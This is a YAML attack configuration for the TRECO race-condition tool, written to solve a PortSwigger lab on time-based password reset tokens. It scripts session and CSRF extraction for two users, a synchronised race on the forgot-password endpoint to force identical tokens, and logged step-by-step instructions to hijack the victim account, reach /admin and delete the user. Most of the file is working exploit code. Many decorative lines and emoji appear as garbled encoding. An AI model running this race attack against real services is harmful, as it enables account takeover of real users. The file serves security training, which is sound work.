# â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
# TRECO Attack Configuration
# Lab: Time-Sensitive Token Race Condition (PortSwigger)
# â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
#
# Exploits predictable password reset tokens that use timestamp-only generation.
# By sending two password reset requests at the exact same millisecond, we force
# the server to generate identical tokens for different users.
#
# Usage:
#   export LAB_HOST="0a1b2c3d.web-security-academy.net"
#   export EXPLOIT_SERVER="exploit-0x1y2z3w.exploit-server.net"
#   treco attack.yaml
#
# â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”

metadata:
  name: "Time-Sensitive Token Race Condition"
  version: "1.0"
  author: "Security Researcher"
  vulnerability: "CWE-330: Use of Insufficiently Random Values"
  description: |
    Exploits predictable password reset tokens that use timestamp-only generation.
    By sending two password reset requests at the exact same millisecond,
    we force the server to generate identical tokens for different users.

target:
  host: "{{ env('LAB_HOST') }}"
  port: 443
  tls:
    enabled: true
    verify_cert: false # false if using proxy with self-signed cert
  # proxy:
  #   type: http
  #   host: 127.0.0.1
  #   port: 8080

entrypoint:
  state: wiener_session
  input:
    exploit_email: "wiener@{{ env('EXPLOIT_SERVER') }}"
    target_user: "carlos"

states:
  # â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
  # Stage 1: Get CSRF Token for Session 1 (wiener)
  # â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
  wiener_session:
    description: "Get CSRF token for first session (wiener)"
    
    request: |
      GET /forgot-password HTTP/1.1
      Host: {{ target.host }}
      User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36
      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
      Accept-Language: en-US,en;q=0.5
      Connection: close
      Cookie: 
    
    extract:
      csrf_token:
        type: xpath
        pattern: '//input[@name="csrf"]/@value'
      
      session:
        type: cookie
        pattern: phpsessionid
    
    logger:
      on_state_leave: |
        ğŸ” Session 1: {{ wiener_session.session[:16] }}...
        ğŸ« CSRF 1: {{ wiener_session.csrf_token[:16] }}...
    
    next:
      - on_status: 200
        goto: carlos_session

  # â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
  # Stage 2: Get CSRF Token for Session 2 (carlos)
  # â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
  carlos_session:
    description: "Get CSRF token for second session (carlos)"
    
    request: |
      GET /forgot-password HTTP/1.1
      Host: {{ target.host }}
      User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36
      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
      Accept-Language: en-US,en;q=0.5
      Connection: close
      Cookie: 
    
    extract:
      csrf_token:
        type: xpath
        pattern: '//input[@name="csrf"]/@value'
      
      session:
        type: cookie
        pattern: phpsessionid
    
    logger:
      on_state_leave: |
        ğŸ” Session 2: {{ carlos_session.session[:16] }}...
        ğŸ« CSRF 2: {{ carlos_session.csrf_token[:16] }}...
        
        âš¡ Ready to race! Two independent sessions prepared.
           â€¢ Thread 1: wiener (our email receives token)
           â€¢ Thread 2: carlos (his email receives same token)
    
    next:
      - on_status: 200
        goto: race_password_reset

  # â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
  # Stage 3: RACE ATTACK - Simultaneous Password Resets
  # â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
  race_password_reset:
    description: "Race condition - generate identical tokens for different users"
    
    input:
      username: ["wiener", "{{ target_user }}"]
      csrf: ["{{ wiener_session.csrf_token }}", "{{ carlos_session.csrf_token }}"]
      session: ["{{ wiener_session.session }}", "{{ carlos_session.session }}"]
    
    race:
      threads: 2
      sync_mechanism: barrier
      connection_strategy: multiplexed
      thread_propagation: single
      input_mode: distribute
    
    request: |
      POST /forgot-password HTTP/1.1
      Host: {{ target.host }}
      Cookie: phpsessionid={{ thread.input.session }}
      Content-Type: application/x-www-form-urlencoded
      
      csrf={{ thread.input.csrf }}&username={{ thread.input.username }}
    
    logger:
      on_thread_enter: |
        ğŸš€ [Thread {{ thread.id + 1 }}/{{ thread.count }}] Requesting reset for: {{ thread.input.username }}
      
      on_thread_leave: |
        {% if response.status_code == 200 %}
        âœ… [Thread {{ thread.id + 1 }}] Reset sent to {{ thread.input.username }}@email ({{ timing_ms }}ms)
        {% else %}
        âŒ [Thread {{ thread.id + 1 }}] Failed: HTTP {{ response.status_code }}
        {% endif %}

      on_state_leave: |
        
        â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
        ğŸ¯ Race Attack Complete!
        â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
        
        ğŸ“§ Next Steps:
        
        1. Check your email at: {{ exploit_email }}
        
        2. Find the password reset email and copy the token:
           /forgot-password?user=wiener&token=TOKEN
                                 ^^^^^^
        
        3. Modify the URL to hijack carlos:
           /forgot-password?user=carlos&token=TOKEN
                                 ^^^^^^
        
        4. Open URL in browser â†’ Set new password
        
        5. Login as carlos â†’ Go to /admin â†’ Delete carlos
        
        6. Lab solved! ğŸ‰
        
        ğŸ’¡ Tip: If tokens are different, run again (~80% success rate per attempt)
    
    next:
      - on_status: 200
        goto: end

  # â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
  # Stage 4: Attack Complete
  # â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
  end:
    description: "Attack executed - manual completion required"
    
    logger:
      on_state_enter: |
        
        â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
        âœ… Attack Successfully Executed
        â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
        
        â±ï¸  Password reset tokens requested with sub-millisecond precision
        ğŸ¯ If timing < 1ms, tokens should be identical
        
        ğŸ” Manual Steps to Complete Lab:
        
        1. ğŸ“§ Access email: https://exploit-YOUR-ID.exploit-server.net/email
        
        2. ğŸ“„ Open password reset email
        
        3. ğŸ“‹ Copy token from reset link
        
        4. ğŸ”— Craft hijack URL:
           https://{{ target.host }}/forgot-password?token=TOKEN&username=carlos
        
        5. ğŸŒ Open URL in browser â†’ Set new password (e.g. "password123")
        
        6. ğŸ”‘ Login as carlos with new password
        
        7. ğŸ‘¤ Navigate to /admin
        
        8. ğŸ—‘ï¸  Delete user carlos
        
        9. ğŸ‰ Congratulations, you solved the lab!
        
        âš ï¸  If token doesn't work:
           â†’ Run attack again (tokens at different timestamps)
           â†’ Success rate: ~80% per attempt with TRECO's precision
        
        ğŸ“Š Why This Works:
           â€¢ Token = hash(timestamp + secret)
           â€¢ Username NOT in hash â†’ Same timestamp = Same token
           â€¢ TRECO timing < 1Î¼s â†’ Guaranteed collision
           â€¢ Token sent to YOUR email, valid for carlos â†’ Account takeover! ğŸ¯